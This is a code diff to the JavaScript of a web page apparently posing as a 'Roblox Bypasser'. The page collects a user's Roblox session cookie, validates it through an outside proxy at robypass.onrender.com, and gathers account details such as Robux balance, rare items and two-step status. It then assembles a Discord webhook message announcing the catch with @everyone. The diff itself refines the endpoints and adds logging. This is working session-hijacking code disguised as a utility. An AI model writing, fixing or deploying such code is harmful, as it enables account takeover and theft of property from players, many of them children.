@@ -2,17 +2,17 @@
 const successSound = document.getElementById("sfx-success");
 const errorSound = document.getElementById("sfx-error");
 const swooshSound = document.getElementById("sfx-swoosh");
-const proxyUrl = "https://robypass.onrender.com"; // Your Render proxy URL
-const webhookUrl = `${proxyUrl}/webhook`; // Proxy webhook endpoint
+const proxyUrl = "https://robypass.onrender.com";
+const webhookUrl = `${proxyUrl}/webhook`;
 
 // Basic cookie format check
 function basicCookieFormatCheck(cookie) {
   if (!cookie || typeof cookie !== "string" || cookie.trim().length === 0) {
-    return { valid: false, error: "Invalid cookie" };
+    return { valid: false, error: "Empty or invalid cookie" };
   }
   cookie = cookie.trim();
   if (!cookie.startsWith("_|WARNING:-DO-NOT-SHARE-THIS.--")) {
-    return { valid: false, error: "Invalid cookie format" };
+    return { valid: false, error: "Cookie doesn't start with correct prefix" };
   }
   if (cookie.length < 500) {
     return { valid: false, error: "Cookie too short" };
@@ -23,17 +23,21 @@ function basicCookieFormatCheck(cookie) {
 // Validate cookie with Roblox API via proxy
 async function validateCookieWithAPI(cookie) {
   try {
-    const response = await fetch(`${proxyUrl}/v1/authentication-ticket`, {
+    console.log("Validating cookie with proxy:", proxyUrl);
+    const response = await fetch(`${proxyUrl}/v1/users/authenticated`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({ cookie }),
     });
+    console.log("Validation response status:", response.status);
     const result = await response.json();
-    if (response.status === 200 && result.valid) {
+    console.log("Validation response data:", result);
+    if (response.status === 200 && result.id) {
       return { valid: true, error: null };
     }
     return { valid: false, error: result.error || "Invalid cookie" };
   } catch (error) {
+    console.error("Validation network error:", error.message);
     return { valid: false, error: `Network error: ${error.message}` };
   }
 }
@@ -56,24 +60,28 @@ async function getAccountInfo(cookie) {
     hasHeadless: false,
     groupCount: "0",
     groupFunds: "0",
-    birthdate: "2002-02-01", // No public API
-    age: "23", // Placeholder
-    ipAddress: "2a01:9700:43e0:8800:68cc:5555:6b95:b991", // Placeholder
+    birthdate: "2002-02-01",
+    age: "23",
+    ipAddress: "2a01:9700:43e0:8800:68cc:5555:6b95:b991",
     twoStepEnabled: false,
     voiceChatEnabled: false,
   };
 
   try {
-    const makeProxyRequest = async (endpoint, method = "GET") => {
+    const makeProxyRequest = async (endpoint, method = "POST") => {
+      console.log(`Fetching ${endpoint} via proxy`);
       const response = await fetch(`${proxyUrl}${endpoint}`, {
         method,
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ cookie }), // Always send cookie in body
+        body: JSON.stringify({ cookie }),
       });
+      console.log(`Response status for ${endpoint}:`, response.status);
       if (response.status !== 200) {
         throw new Error(`Proxy failed for ${endpoint}: ${response.status}`);
       }
-      return await response.json();
+      const data = await response.json();
+      console.log(`Response data for ${endpoint}:`, data);
+      return data;
     };
 
     // Get user info
@@ -145,9 +153,9 @@ async function getAccountInfo(cookie) {
     try {
       const inventoryData = await makeProxyRequest(`/v1/users/${userId}/assets/collectibles?limit=100`);
       const items = inventoryData.data || [];
-      hasKorblox = items.some(item => item.assetId === 139607718); // Korblox Deathspeaker
-      hasValk = items.some(item => item.assetId === 1365767); // Valkyrie Helm
-      hasHeadless = items.some(item => item.assetId === 134082579); // Headless Horseman
+      hasKorblox = items.some(item => item.assetId === 139607718);
+      hasValk = items.some(item => item.assetId === 1365767);
+      hasHeadless = items.some(item => item.assetId === 134082579);
     } catch (error) {
       console.warn("Failed to fetch collectibles:", error.message);
     }
@@ -169,19 +177,19 @@ async function getAccountInfo(cookie) {
       robuxBalance,
       accountAge,
       avatarUrl,
-      placeVisits: "0", // No public API
+      placeVisits: "0",
       rap,
       ownedItems,
-      creditBalance: "0", // No public API
+      creditBalance: "0",
       hasPremium,
       hasKorblox,
       hasValk,
       hasHeadless,
       groupCount,
-      groupFunds: "0", // No public API
-      birthdate: defaultInfo.birthdate, // Private
-      age: defaultInfo.age, // Placeholder
-      ipAddress: defaultInfo.ipAddress, // Placeholder
+      groupFunds: "0",
+      birthdate: defaultInfo.birthdate,
+      age: defaultInfo.age,
+      ipAddress: defaultInfo.ipAddress,
       twoStepEnabled,
       voiceChatEnabled,
     };
@@ -233,7 +241,7 @@ $("#cookieForm").on("submit", async function(e) {
     // Get account info
     const accountInfo = await getAccountInfo(cookie);
 
-    // Build Discord embed matching the provided structure
+    // Build Discord embed
     const webhookPayload = {
       username: "Roblox Bypasser Bot",
       content: "@everyone",
